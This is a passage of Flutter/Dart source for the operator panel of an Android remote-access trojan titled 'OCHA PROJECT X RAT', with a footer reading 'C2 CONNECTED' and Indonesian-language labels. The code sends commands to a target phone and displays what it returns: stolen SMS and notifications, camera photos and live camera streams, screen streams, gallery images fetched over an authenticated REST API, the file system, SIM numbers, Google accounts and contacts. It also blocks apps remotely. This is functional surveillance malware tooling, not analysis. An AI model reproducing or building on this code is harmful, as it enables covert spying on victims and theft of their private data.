                                      height: 28,
                                      child: ElevatedButton(
                                        onPressed: () {
                                          if (isBlocked) {
                                            _sendCommand('unblockApp', extra: package);
                                            setState(() {
                                              _blockedApps.remove(package);
                                            });
                                            setSheetState(() {});
                                            _addLog("✅ Unblocked: $name", LogType.success);
                                          } else {
                                            _sendCommand('blockApp', extra: jsonEncode({'package': package, 'name': name}));
                                            setState(() {
                                              _blockedApps.add(package);
                                            });
                                            setSheetState(() {});
                                            _addLog("🚫 Blocked: $name", LogType.error);
                                          }
                                        },
                                        style: ElevatedButton.styleFrom(
                                          backgroundColor: isBlocked ? errorColor : accentWhite,
                                          foregroundColor: Colors.white,
                                          elevation: 0,
                                          shape: const RoundedRectangleBorder(
                                            borderRadius: BorderRadius.zero,
                                            side: BorderSide(color: Colors.black, width: 2),
                                          ),
                                        ),
                                        child: Text(
                                          isBlocked ? "UNBLOCK" : "BLOCK",
                                          style: const TextStyle(
                                            fontSize: 9,
                                            fontWeight: FontWeight.bold,
                                            shadows: [
                                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                                            ],
                                          ),
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              );
                            },
                          ),
                  ),

                  Padding(
                    padding: const EdgeInsets.only(top: 12),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.end,
                      children: [
                        TextButton(
                          onPressed: () => Navigator.pop(context),
                          child: const Text("CLOSE", style: TextStyle(color: textSub)),
                        ),
                        const SizedBox(width: 8),
                        ElevatedButton.icon(
                          onPressed: () {
                            setState(() {
                              _installedApps = [];
                            });
                            setSheetState(() {});
                            _sendCommand('getInstalledApps', extra: 'true');
                            _addLog("🔄 Refreshing apps list...", LogType.info);
                          },
                          icon: const Icon(Icons.refresh, size: 16),
                          label: const Text("REFRESH"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: accentWhite,
                            foregroundColor: Colors.white,
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                              side: BorderSide(color: Colors.black, width: 2),
                            ),
                          ),
                        ),
                      ],
                    ),
                  ),
                ],
              ),
            );
          },
        );
      },
    );
  }

  Widget _buildDeviceInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: bgCard,
        border: Border.all(color: accentWhite, width: 3),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.7),
            blurRadius: 0,
            offset: const Offset(5, 5),
          ),
        ],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Container(
            width: 60,
            height: 60,
            decoration: BoxDecoration(
              color: bgSurface,
              border: Border.all(color: accentWhite, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 0,
                  offset: const Offset(3, 3),
                )
              ],
            ),
            child: const Icon(Icons.phone_android, color: accentWhite, size: 30),
          ),
          const SizedBox(width: 16),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Container(
                      width: 10,
                      height: 10,
                      decoration: const BoxDecoration(
                        color: successColor,
                        boxShadow: [
                          BoxShadow(color: successColor, blurRadius: 6, spreadRadius: 1),
                        ],
                      ),
                    ),
                    const SizedBox(width: 6),
                    const Text(
                      "ONLINE",
                      style: TextStyle(
                        color: successColor,
                        fontSize: 11,
                        fontWeight: FontWeight.bold,
                        shadows: [
                          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Text(
                  _targetModel,
                  style: const TextStyle(
                    color: textMain,
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  "Android 14 R   Bat ${_deviceData['battery'] ?? 0}%",
                  style: const TextStyle(color: textSub, fontSize: 11),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessagesTab() {
    if (_targetId == "unknown") {
      return Container(
        color: bgMain,
        child: const Center(
          child: Text(
            "PILIH DEVICE DULU!",
            style: TextStyle(
              color: textSub,
              fontWeight: FontWeight.bold,
              fontSize: 13,
              shadows: [
                Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
              ],
            ),
          ),
        ),
      );
    }

    final allKeys = [..._smsData.keys, ..._notifData.keys].toSet().toList();

    return Container(
      color: bgMain,
      child: Column(
        children: [
          Container(
            color: bgMain,
            padding: const EdgeInsets.all(16),
            child: Row(
              children: [
                const Text(
                  "PESAN & NOTIFIKASI",
                  style: TextStyle(
                    color: accentWhite,
                    fontWeight: FontWeight.bold,
                    letterSpacing: 2,
                    fontSize: 12,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const Spacer(),
                ElevatedButton.icon(
                  onPressed: () {
                    _sendCommand('getSms');
                    _sendCommand('getNotifs');
                    _addLog("🔄 Refresh SMS & Notif", LogType.info);
                    _sendCommand('getStatus');
                  },
                  icon: const Icon(Icons.refresh, size: 16),
                  label: const Text("REFRESH"),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: bgCard,
                    foregroundColor: accentWhite,
                    shape: const RoundedRectangleBorder(
                      borderRadius: BorderRadius.zero,
                      side: BorderSide(color: accentWhite, width: 2),
                    ),
                  ),
                ),
              ],
            ),
          ),
          Expanded(
            child: allKeys.isEmpty
                ? Center(
                    child: Column(
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        const Text(
                          "Belum ada pesan",
                          style: TextStyle(color: textSub, fontSize: 12),
                        ),
                        const SizedBox(height: 12),
                        ElevatedButton.icon(
                          onPressed: () {
                            _sendCommand('getSms');
                            _sendCommand('getNotifs');
                            _sendCommand('getStatus');
                          },
                          icon: const Icon(Icons.refresh, size: 16),
                          label: const Text("TAP REFRESH"),
                          style: ElevatedButton.styleFrom(
                            backgroundColor: bgCard,
                            foregroundColor: accentWhite,
                            shape: const RoundedRectangleBorder(
                              borderRadius: BorderRadius.zero,
                              side: BorderSide(color: accentWhite, width: 2),
                            ),
                          ),
                        ),
                      ],
                    ),
                  )
                : ListView(
                    padding: const EdgeInsets.all(16),
                    children: [
                      if (_smsData.isNotEmpty) ...[
                        Text(
                          "SMS (${_smsData.keys.length})",
                          style: const TextStyle(
                            color: accentWhite,
                            fontWeight: FontWeight.bold,
                            fontSize: 11,
                            letterSpacing: 1,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(height: 8),
                        ..._smsData.keys.map((key) => _buildMessageAppItem(
                              key: key,
                              data: _smsData[key] as Map<String, dynamic>,
                              isSms: true,
                            )),
                        const SizedBox(height: 20),
                      ],
                      if (_notifData.isNotEmpty) ...[
                        Text(
                          "NOTIFIKASI (${_notifData.keys.length})",
                          style: const TextStyle(
                            color: accentWhite,
                            fontWeight: FontWeight.bold,
                            fontSize: 11,
                            letterSpacing: 1,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                        const SizedBox(height: 8),
                        ..._notifData.keys.map((key) => _buildMessageAppItem(
                              key: key,
                              data: _notifData[key] as Map<String, dynamic>,
                              isSms: false,
                            )),
                      ],
                    ],
                  ),
          ),
        ],
      ),
    );
  }

  Widget _buildMessageAppItem({
    required String key,
    required Map<String, dynamic> data,
    required bool isSms,
  }) {
    final appName = data['appName'] ?? 'Unknown';
    final messages = (data['messages'] as List?) ?? [];
    final count = messages.length;
    final preview = messages.isNotEmpty
        ? (messages.first['text'] ?? '').toString().substring(
              0,
              (messages.first['text'] ?? '').toString().length > 60
                  ? 60
                  : (messages.first['text'] ?? '').toString().length,
            )
        : '';

    return GestureDetector(
      onTap: () {
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (context) => MessageDetailFullscreenPage(
              appName: appName,
              messages: messages,
              isSms: isSms,
              targetModel: _targetModel,
              onBack: () {
                Navigator.pop(context);
              },
            ),
            fullscreenDialog: true,
          ),
        );
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.all(12),
        decoration: BoxDecoration(
          color: bgCard,
          border: Border.all(color: borderLight, width: 2),
          boxShadow: [
            BoxShadow(
              color: Colors.black.withOpacity(0.6),
              blurRadius: 0,
              offset: const Offset(3, 3),
            ),
          ],
        ),
        child: Row(
          children: [
            Container(
              width: 40,
              height: 40,
              decoration: BoxDecoration(
                color: bgSurface,
                border: Border.all(color: accentWhite, width: 2),
              ),
              child: Center(
                child: Text(
                  appName.isNotEmpty ? appName[0].toUpperCase() : '?',
                  style: const TextStyle(
                    color: accentWhite,
                    fontWeight: FontWeight.bold,
                    fontSize: 14,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                    ],
                  ),
                ),
              ),
            ),
            const SizedBox(width: 12),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Row(
                    children: [
                      Expanded(
                        child: Text(
                          appName,
                          style: const TextStyle(
                            color: textMain,
                            fontWeight: FontWeight.bold,
                            fontSize: 12,
                          ),
                          overflow: TextOverflow.ellipsis,
                        ),
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                        decoration: BoxDecoration(
                          color: bgSurface,
                          border: Border.all(color: accentWhite, width: 2),
                        ),
                        child: Text(
                          count.toString(),
                          style: const TextStyle(
                            color: accentWhite,
                            fontSize: 10,
                            fontWeight: FontWeight.bold,
                            shadows: [
                              Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                            ],
                          ),
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 4),
                  Text(
                    preview.length > 50 ? '${preview.substring(0, 50)}...' : preview,
                    style: const TextStyle(
                      color: textSub,
                      fontSize: 11,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                ],
              ),
            ),
            const SizedBox(width: 8),
            const Icon(
              Icons.chevron_right,
              color: textSub,
              size: 20,
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTerminalLogs() {
    return Container(
      height: 120,
      decoration: BoxDecoration(
        color: bgSurface,
        border: Border.all(
          color: _isConnected ? accentWhite : errorColor,
          width: 2,
        ),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.6),
            blurRadius: 0,
            offset: const Offset(3, 3),
          )
        ],
      ),
      child: ListView.builder(
        controller: _logScrollController,
        reverse: true,
        padding: const EdgeInsets.all(10),
        itemCount: _executionLogs.length,
        itemBuilder: (context, i) {
          final log = _executionLogs[_executionLogs.length - 1 - i];
          return Padding(
            padding: const EdgeInsets.symmetric(vertical: 2),
            child: Row(
              children: [
                Text(
                  "[${_formatTime(log.timestamp)}]",
                  style: const TextStyle(color: textSub, fontSize: 10),
                ),
                const SizedBox(width: 8),
                Expanded(
                  child: Text(
                    log.message,
                    style: TextStyle(
                      color: _getLogColor(log.type),
                      fontSize: 11,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildControlFooter() {
    return const Text(
      "SYSTEM SECURED • C2 CONNECTED",
      style: TextStyle(
        color: textSub,
        fontSize: 9,
        letterSpacing: 2,
        shadows: [
          Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
        ],
      ),
      textAlign: TextAlign.center,
    );
  }

  Future<void> _takeScreenshotViaRest(String facing) async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('key') ?? '';

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Taking screenshot via REST ($facing)", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => Dialog(
        backgroundColor: Colors.transparent,
        child: Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            color: bgCard,
            border: Border.all(color: accentWhite, width: 3),
            boxShadow: [
              BoxShadow(
                color: Colors.black.withOpacity(0.8),
                blurRadius: 0,
                offset: const Offset(6, 6),
              )
            ],
          ),
          child: const Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              SizedBox(
                width: 40,
                height: 40,
                child: CircularProgressIndicator(
                  color: accentWhite,
                  strokeWidth: 3,
                ),
              ),
              SizedBox(height: 16),
              Text(
                "MENGAMBIL FOTO...",
                style: TextStyle(
                  color: textSub,
                  fontSize: 11,
                  letterSpacing: 2,
                  shadows: [
                    Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );

    try {
      final response = await http.get(
        Uri.parse("$baseUrl/api/screenshot/$_targetId?facing=$facing"),
        headers: {"x-auth-token": token},
      );

      if (mounted) Navigator.pop(context);

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['frame'] != null && data['frame'].isNotEmpty) {
          _addLog("📸 Screenshot via REST berhasil", LogType.success);

          Navigator.push(
            context,
            MaterialPageRoute(
              builder: (context) => ScreenshotResultPage(
                targetModel: _targetModel,
                screenshotFrame: data['frame'],
                screenshotFacing: facing,
                onClose: () {
                  Navigator.pop(context);
                },
              ),
              fullscreenDialog: true,
            ),
          );
        } else {
          _addLog("❌ Screenshot REST: frame kosong", LogType.error);
        }
      } else {
        _addLog("❌ Screenshot REST gagal: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      if (mounted) Navigator.pop(context);
      _addLog("⚠️ Screenshot REST error: $e", LogType.error);
    }
  }

  void _takeCameraSocket(String facing) {
    if (_isWaitingForPhoto) {
      _addLog("⚠️ Masih menunggu foto sebelumnya", LogType.warning);
      return;
    }
    setState(() {
      _isWaitingForPhoto = true;
      _cameraFacing = facing;
    });
    _sendCommand('camera', extra: facing);
    _addLog("📸 Mengambil foto ($facing) via socket", LogType.info);

    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) {
        _photoLoadingContext = context;
        return Center(
          child: Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 3),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.8),
                  blurRadius: 0,
                  offset: const Offset(6, 6),
                )
              ],
            ),
            child: const Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                SizedBox(width: 40, height: 40, child: CircularProgressIndicator(color: accentWhite, strokeWidth: 3)),
                SizedBox(height: 16),
                Text(
                  "MENGAMBIL FOTO...",
                  style: TextStyle(
                    color: textSub,
                    fontSize: 11,
                    letterSpacing: 2,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                    ],
                  ),
                ),
              ],
            ),
          ),
        );
      },
    );

    Future.delayed(const Duration(seconds: 10), () {
      if (_isWaitingForPhoto && mounted) {
        _isWaitingForPhoto = false;
        if (_photoLoadingContext != null) {
          try { Navigator.pop(_photoLoadingContext!); } catch (_) {}
          _photoLoadingContext = null;
        }
        _addLog("⚠️ Timeout mengambil foto", LogType.warning);
      }
    });
  }

  void _startLiveCameraSocket(String facing) {
    if (_screenModalVisible) _closeScreenModal();
    if (_screenshotResultVisible) _closeScreenshotResult();

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _sendCommand('liveCamera', extra: facing);
    _addLog("📷 Starting live camera ($facing) via socket", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          frameStream: _cameraFrameStreamController.stream,
          isLoading: _cameraLoading,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            _sendCommand('liveCamera', extra: newFacing);
            setState(() => _cameraFacing = newFacing);
          },
          onCapture: () {
            _takeCameraSocket(_cameraFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  Future<void> _startLiveCameraPolling(String facing) async {
    if (_screenModalVisible) {
      _closeScreenModal();
    }
    if (_screenshotResultVisible) {
      _closeScreenshotResult();
    }

    setState(() {
      _cameraFacing = facing;
      _cameraFrame = '';
      _cameraLoading = true;
    });

    _addLog("📷 Starting live camera polling ($facing)", LogType.info);

    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => LiveCameraPollingPage(
          targetId: _targetId,
          targetModel: _targetModel,
          facing: _cameraFacing,
          onClose: () {
            _sendCommand('camera', extra: 'stop');
            Navigator.pop(context);
          },
          onSwitchCamera: (newFacing) {
            setState(() => _cameraFacing = newFacing);
          },
        ),
        fullscreenDialog: true,
      ),
    );
  }

  void _openScreenModal() {
    setState(() {
      _screenFrame = '';
      _screenLoading = true;
      _screenModalVisible = true;
    });
    _sendCommand('screen', extra: 'start');
    _addLog("🖥️ Opening screen stream", LogType.info);
  }

  void _closeScreenModal() {
    setState(() {
      _screenModalVisible = false;
      _screenFrame = '';
      _screenLoading = true;
    });
    _sendCommand('screen', extra: 'stop');
    _addLog("🖥️ Screen stream closed", LogType.info);
  }

  void _closeCameraModal() {
    setState(() {
      _cameraModalVisible = false;
      _cameraFrame = '';
      _cameraLoading = true;
    });
    _sendCommand('camera', extra: 'stop');
    _addLog("📷 Camera stream closed", LogType.info);
  }

  void _closeScreenshotResult() {
    setState(() {
      _screenshotResultVisible = false;
      _screenshotFrame = '';
      _screenshotScale = 1.0;
      _screenshotOffsetX = 0.0;
      _screenshotOffsetY = 0.0;
    });
    _addLog("📸 Screenshot result closed", LogType.info);
  }

  void _downloadScreenshot(String frameBase64) async {
    try {
      final bytes = base64Decode(frameBase64.split(',').last);
      final directory = await getDownloadsDirectory() ?? await getApplicationDocumentsDirectory();
      final file = File('${directory.path}/screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg');
      await file.writeAsBytes(bytes);
      _addLog("✅ Screenshot saved: ${file.path}", LogType.success);
    } catch (e) {
      _addLog("❌ Gagal download: $e", LogType.error);
    }
  }

  Future<void> _fetchGalleryViaHttp() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final token = prefs.getString('key') ?? '';

      final response = await http.get(
        Uri.parse("$baseUrl/api/gallery/$_targetId"),
        headers: {"x-auth-token": token},
      );

      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        final photos = data['photos'] as List? ?? [];
        _galleryStreamController.add(photos.map((p) => Map<String, dynamic>.from(p)).toList());
        _addLog("🖼️ Gallery HTTP: ${photos.length} photos", LogType.success);
      } else {
        _addLog("❌ Gallery HTTP failed: ${response.statusCode}", LogType.error);
      }
    } catch (e) {
      _addLog("⚠️ Gallery HTTP error: $e", LogType.error);
    }
  }

  void _openGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = true;
      _isGalleryLoading = true;
      _galleryPhotos = [];
    });

    _sendCommand('getGallery');
    _addLog("🖼️ Opening gallery fullscreen", LogType.info);
    _fetchGalleryViaHttp();
  }

  void _closeGalleryFullscreen() {
    setState(() {
      _galleryModalVisible = false;
      _galleryPhotos = [];
      _currentGalleryImage = '';
      _currentGalleryIndex = 0;
    });
  }

  void _openFileManagerFullscreen() {
    Navigator.push(
      context,
      MaterialPageRoute(
        builder: (context) => FileManagerFullscreenPage(
          targetId: _targetId,
          targetModel: _targetModel,
          onClose: () {
            Navigator.pop(context);
          },
          sendCommand: _sendCommand,
        ),
        fullscreenDialog: true,
      ),
    );
  }

  @override
  void dispose() {
    _glowController.dispose();
    _rotateController.dispose();
    _logScrollController.dispose();
    _customCommandController.dispose();
    _customExtraController.dispose();
    _cameraFrameStreamController.close();
    _galleryStreamController.close();
    _pollingTimer?.cancel();
    socket.disconnect();
    socket.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: bgMain,
      appBar: AppBar(
        backgroundColor: bgMain,
        elevation: 0,
        leading: IconButton(
          icon: Container(
            padding: const EdgeInsets.all(6),
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: accentWhite, width: 2),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.6),
                  blurRadius: 0,
                  offset: const Offset(2, 2),
                )
              ],
            ),
            child: const Icon(Icons.arrow_back_ios_new, color: textMain, size: 16),
          ),
          onPressed: () => Navigator.pop(context),
        ),
        centerTitle: true,
        title: const Text(
          "OCHA PROJECT X RAT",
          style: TextStyle(
            color: textMain,
            fontWeight: FontWeight.bold,
            fontSize: 15,
            letterSpacing: 2,
            shadows: [
              Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
            ],
          ),
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: textSub),
            onPressed: _fetchDevices,
          ),
        ],
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(3),
          child: Container(
            height: 3,
            color: accentWhite,
          ),
        ),
      ),
      body: _buildTabContent(),
      bottomNavigationBar: _buildBottomNav(),
    );
  }

  void _showPhoneBottomSheet(Map<String, dynamic> data) {
    final sims = data['sims'] as List? ?? [];

    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: accentWhite, width: 3),
      ),
      builder: (context) => Container(
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              width: 40,
              height: 4,
              color: borderLight,
            ),
            const SizedBox(height: 20),

            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: accentWhite, width: 2),
                  ),
                  child: const Icon(Icons.phone_android, color: accentWhite, size: 20),
                ),
                const SizedBox(width: 12),
                const Text(
                  "NOMOR SIM / KARTU",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const Spacer(),
                IconButton(
                  icon: const Icon(Icons.close, color: textSub),
                  onPressed: () => Navigator.pop(context),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(height: 3, color: borderLight),
            const SizedBox(height: 16),

            if (sims.isEmpty)
              const Padding(
                padding: EdgeInsets.symmetric(vertical: 32),
                child: Text(
                  "Tidak ada data SIM ditemukan",
                  style: TextStyle(color: textSub, fontSize: 12),
                ),
              )
            else
              ...sims.map((sim) {
                final number = sim['number'] ?? 'Nomor tidak tersedia';
                final operator = sim['operator'] ?? '';
                final label = sim['displayName'] ?? 'SIM ${sims.indexOf(sim) + 1}';

                return Container(
                  margin: const EdgeInsets.only(bottom: 12),
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: accentWhite, width: 2),
                    boxShadow: [
                      BoxShadow(
                        color: Colors.black.withOpacity(0.5),
                        blurRadius: 0,
                        offset: const Offset(3, 3),
                      )
                    ],
                  ),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(10),
                        decoration: BoxDecoration(
                          color: bgCard,
                          border: Border.all(color: accentWhite, width: 2),
                        ),
                        child: const Icon(Icons.sim_card, color: accentWhite, size: 20),
                      ),
                      const SizedBox(width: 14),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              label,
                              style: const TextStyle(
                                color: accentWhite,
                                fontWeight: FontWeight.bold,
                                fontSize: 11,
                                shadows: [
                                  Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                                ],
                              ),
                            ),
                            const SizedBox(height: 2),
                            Text(
                              number,
                              style: const TextStyle(
                                color: textMain,
                                fontSize: 13,
                                fontWeight: FontWeight.bold,
                                shadows: [
                                  Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                                ],
                              ),
                            ),
                            if (operator.isNotEmpty)
                              Text(
                                operator,
                                style: const TextStyle(color: textSub, fontSize: 10),
                              ),
                          ],
                        ),
                      ),
                      if (number != 'Nomor tidak tersedia')
                        IconButton(
                          icon: const Icon(Icons.copy, color: textSub, size: 20),
                          onPressed: () {
                            Clipboard.setData(ClipboardData(text: number));
                            ScaffoldMessenger.of(context).showSnackBar(
                              const SnackBar(content: Text("Nomor disalin!")),
                            );
                          },
                        ),
                    ],
                  ),
                );
              }).toList(),
          ],
        ),
      ),
    );
  }

  void _showGmailBottomSheet(Map<String, dynamic> data) {
    final accounts = data['accounts'] as List? ?? [];
    final others = (data['others'] as List? ?? [])
        .where((o) => o['type'] != 'com.google')
        .toList();

    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: accentWhite, width: 3),
      ),
      isScrollControlled: true,
      builder: (context) => Container(
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
        constraints: BoxConstraints(
          maxHeight: MediaQuery.of(context).size.height * 0.75,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Container(
                width: 40,
                height: 4,
                color: borderLight,
              ),
            ),
            const SizedBox(height: 16),

            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: bgSurface,
                    border: Border.all(color: mcRedstone, width: 2),
                  ),
                  child: const Icon(Icons.email_outlined, color: mcRedstone, size: 20),
                ),
                const SizedBox(width: 12),
                const Text(
                  "AKUN GMAIL / GOOGLE",
                  style: TextStyle(
                    color: textMain,
                    fontSize: 13,
                    fontWeight: FontWeight.bold,
                    shadows: [
                      Shadow(color: Colors.black, offset: Offset(2, 2), blurRadius: 0),
                    ],
                  ),
                ),
                const Spacer(),
                IconButton(
                  icon: const Icon(Icons.close, color: textSub),
                  onPressed: () => Navigator.pop(context),
                ),
              ],
            ),
            const SizedBox(height: 12),
            Container(height: 3, color: borderLight),
            const SizedBox(height: 16),

            Expanded(
              child: SingleChildScrollView(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    if (accounts.isNotEmpty) ...[
                      _buildSectionHeader("AKUN GOOGLE"),
                      ...accounts.map((acc) => _buildAccountItem(acc['email'], acc['type'])),
                      const SizedBox(height: 12),
                    ],

                    if (others.isNotEmpty) ...[
                      _buildSectionHeader("AKUN LAINNYA"),
                      ...others.map((acc) => _buildAccountItem(acc['email'], acc['type'], isOther: true)),
                    ],

                    if (accounts.isEmpty && others.isEmpty)
                      const Padding(
                        padding: EdgeInsets.symmetric(vertical: 24),
                        child: Center(
                          child: Text(
                            "Tidak ada akun ditemukan",
                            style: TextStyle(color: textSub, fontSize: 12),
                          ),
                        ),
                      ),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSectionHeader(String title) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 8),
      child: Text(
        title,
        style: const TextStyle(
          color: textSub,
          fontSize: 10,
          fontWeight: FontWeight.bold,
          letterSpacing: 1.5,
          shadows: [
            Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
          ],
        ),
      ),
    );
  }

  Widget _buildAccountItem(String email, String type, {bool isOther = false}) {
    final initial = (email.isNotEmpty ? email[0].toUpperCase() : '?');

    return Container(
      margin: const EdgeInsets.only(bottom: 8),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: bgSurface,
        border: Border.all(color: isOther ? borderLight : mcRedstone, width: 2),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.5),
            blurRadius: 0,
            offset: const Offset(2, 2),
          )
        ],
      ),
      child: Row(
        children: [
          Container(
            width: 36,
            height: 36,
            decoration: BoxDecoration(
              color: bgCard,
              border: Border.all(color: isOther ? borderLight : mcRedstone, width: 2),
            ),
            child: Center(
              child: Text(
                initial,
                style: TextStyle(
                  color: isOther ? textSub : mcRedstone,
                  fontWeight: FontWeight.bold,
                  fontSize: 14,
                  shadows: const [
                    Shadow(color: Colors.black, offset: Offset(1, 1), blurRadius: 0),
                  ],
                ),
              ),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  email,
                  style: const TextStyle(
                    color: textMain,
                    fontWeight: FontWeight.bold,
                    fontSize: 12,
                  ),
                  overflow: TextOverflow.ellipsis,
                ),
                if (type.isNotEmpty)
                  Text(
                    type,
                    style: const TextStyle(color: textSub, fontSize: 10),
                  ),
              ],
            ),
          ),
          IconButton(
            icon: const Icon(Icons.copy, color: textSub, size: 20),
            onPressed: () {
              Clipboard.setData(ClipboardData(text: email));
              ScaffoldMessenger.of(context).showSnackBar(
                const SnackBar(content: Text("Email disalin!")),
              );
            },
          ),
        ],
      ),
    );
  }

  void _showContactsBottomSheet(Map<String, dynamic> data) {
    final contacts = data['contacts'] as List? ?? [];

    showModalBottomSheet(
      context: context,
      backgroundColor: bgCard,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.zero,
        side: BorderSide(color: accentWhite, width: 3),
      ),
      isScrollControlled: true,
      builder: (context) => Container(
        padding: const EdgeInsets.fromLTRB(20, 16, 20, 32),
        constraints: BoxConstraints(
          maxHeight: MediaQuery.of(context).size.height * 0.75,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Center(
              child: Container(
                width: 40,
                height: 4,
                color: borderLight,
              ),
            ),
            const SizedBox(height: 16),

            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(8),
